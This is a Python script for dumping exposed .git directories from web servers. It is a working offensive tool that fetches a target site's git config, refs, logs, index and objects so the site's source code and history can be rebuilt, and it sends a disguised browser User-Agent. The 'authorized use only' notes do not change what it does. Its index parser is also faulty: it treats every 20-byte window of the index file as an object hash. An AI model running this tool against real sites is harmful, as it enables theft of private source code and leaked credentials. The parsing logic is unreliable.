#!/usr/bin/env python3
"""
Git Dumper - Tool for dumping exposed .git directories
For authorized security testing and CTF challenges only
"""

import sys
import re
import requests
import argparse
from urllib.parse import urljoin
from pathlib import Path


class GitDumper:
    def __init__(self, url, output_dir):
        self.base_url = url.rstrip('/') + '/.git/'
        self.output_dir = Path(output_dir)
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })

    def download_file(self, path):
        """Download a file from the .git directory"""
        url = urljoin(self.base_url, path)
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                return response.content
            return None
        except Exception as e:
            print(f"[-] Error downloading {path}: {e}")
            return None

    def save_file(self, path, content):
        """Save content to local file"""
        file_path = self.output_dir / path
        file_path.parent.mkdir(parents=True, exist_ok=True)

        with open(file_path, 'wb') as f:
            f.write(content)
        print(f"[+] Saved: {path}")

    def dump_basic_files(self):
        """Download basic .git files"""
        basic_files = [
            'HEAD',
            'config',
            'description',
            'index',
            'packed-refs',
            'FETCH_HEAD',
            'ORIG_HEAD',
        ]

        print("[*] Downloading basic files...")
        for file in basic_files:
            content = self.download_file(file)
            if content:
                self.save_file(f'.git/{file}', content)

    def dump_refs(self):
        """Download refs directory"""
        print("[*] Downloading refs...")
        ref_paths = [
            'refs/heads/master',
            'refs/heads/main',
            'refs/remotes/origin/master',
            'refs/remotes/origin/main',
            'refs/remotes/origin/HEAD',
            'refs/stash',
        ]

        for ref_path in ref_paths:
            content = self.download_file(ref_path)
            if content:
                self.save_file(f'.git/{ref_path}', content)

    def dump_logs(self):
        """Download logs"""
        print("[*] Downloading logs...")
        log_paths = [
            'logs/HEAD',
            'logs/refs/heads/master',
            'logs/refs/heads/main',
            'logs/refs/remotes/origin/master',
            'logs/refs/remotes/origin/main',
        ]

        for log_path in log_paths:
            content = self.download_file(log_path)
            if content:
                self.save_file(f'.git/{log_path}', content)

    def parse_index_file(self):
        """Parse index file to get object hashes"""
        index_path = self.output_dir / '.git' / 'index'
        if not index_path.exists():
            return []

        print("[*] Parsing index file...")
        with open(index_path, 'rb') as f:
            content = f.read()

        # Simple parsing to extract SHA-1 hashes (40 hex chars)
        hashes = []
        i = 0
        while i < len(content) - 20:
            # Look for 20-byte sequences that might be SHA-1 hashes
            chunk = content[i:i+20]
            hex_hash = chunk.hex()
            if len(hex_hash) == 40:
                hashes.append(hex_hash)
            i += 1

        return list(set(hashes))

    def dump_object(self, sha1_hash):
        """Download a git object by its SHA-1 hash"""
        # Git objects are stored as .git/objects/[first 2 chars]/[remaining 38 chars]
        obj_path = f'objects/{sha1_hash[:2]}/{sha1_hash[2:]}'
        content = self.download_file(obj_path)

        if content:
            self.save_file(f'.git/{obj_path}', content)
            return True
        return False

    def dump_objects_from_refs(self):
        """Download objects referenced in refs"""
        print("[*] Downloading objects from refs...")
        git_dir = self.output_dir / '.git'

        # Read all ref files to get commit hashes
        hashes = set()

        # Read HEAD
        head_file = git_dir / 'HEAD'
        if head_file.exists():
            with open(head_file, 'r') as f:
                content = f.read().strip()
                if content.startswith('ref:'):
                    # It's a reference, try to read that ref
                    ref_path = content.split('ref: ')[1]
                    ref_file = git_dir / ref_path
                    if ref_file.exists():
                        with open(ref_file, 'r') as rf:
                            hashes.add(rf.read().strip())

        # Read all refs
        refs_dir = git_dir / 'refs'
        if refs_dir.exists():
            for ref_file in refs_dir.rglob('*'):
                if ref_file.is_file():
                    with open(ref_file, 'r') as f:
                        content = f.read().strip()
                        if len(content) == 40:  # SHA-1 hash length
                            hashes.add(content)

        # Download each object
        for sha1_hash in hashes:
            print(f"[*] Downloading object: {sha1_hash}")
            self.dump_object(sha1_hash)

    def dump_objects_from_index(self):
        """Download objects found in index file"""
        print("[*] Downloading objects from index...")
        hashes = self.parse_index_file()

        for sha1_hash in hashes:
            if len(sha1_hash) == 40:  # Valid SHA-1 hash
                self.dump_object(sha1_hash)

    def check_git_exposed(self):
        """Check if .git directory is exposed"""
        print(f"[*] Checking {self.base_url}")

        # Try to access HEAD file
        content = self.download_file('HEAD')
        if content and b'ref:' in content:
            print("[+] .git directory is exposed!")
            return True
        else:
            print("[-] .git directory not accessible")
            return False

    def dump(self):
        """Main dump function"""
        print(f"[*] Starting git dump from {self.base_url}")
        print(f"[*] Output directory: {self.output_dir}")

        if not self.check_git_exposed():
            return False

        # Create output directory
        self.output_dir.mkdir(parents=True, exist_ok=True)

        # Dump files
        self.dump_basic_files()
        self.dump_refs()
        self.dump_logs()
        self.dump_objects_from_refs()
        self.dump_objects_from_index()

        print("\n[+] Dump completed!")
        print(
            f"[*] Try to extract files using: cd {self.output_dir} && git checkout -- .")
        return True


def main():
    parser = argparse.ArgumentParser(
        description='Git Dumper - Dump exposed .git directories (Authorized use only)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
            Examples:
            python git_dumper.py http://example.com/.git ./output
            python git_dumper.py https://target.com ./dump

            For authorized security testing and CTF challenges only.
                    """
    )

    parser.add_argument('url', help='Target URL (with or without /.git)')
    parser.add_argument('output', type=str, nargs='?',
                        default='./output', help='Output directory (default: ./output)')

    args = parser.parse_args()

    # Ensure URL has http/https
    url = args.url
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'http://' + url

    url = re.sub(r'\.git(\/|)', '', url)
    dumper = GitDumper(url, args.output)
    success = dumper.dump()

    sys.exit(0 if success else 1)


if __name__ == '__main__':
    main()
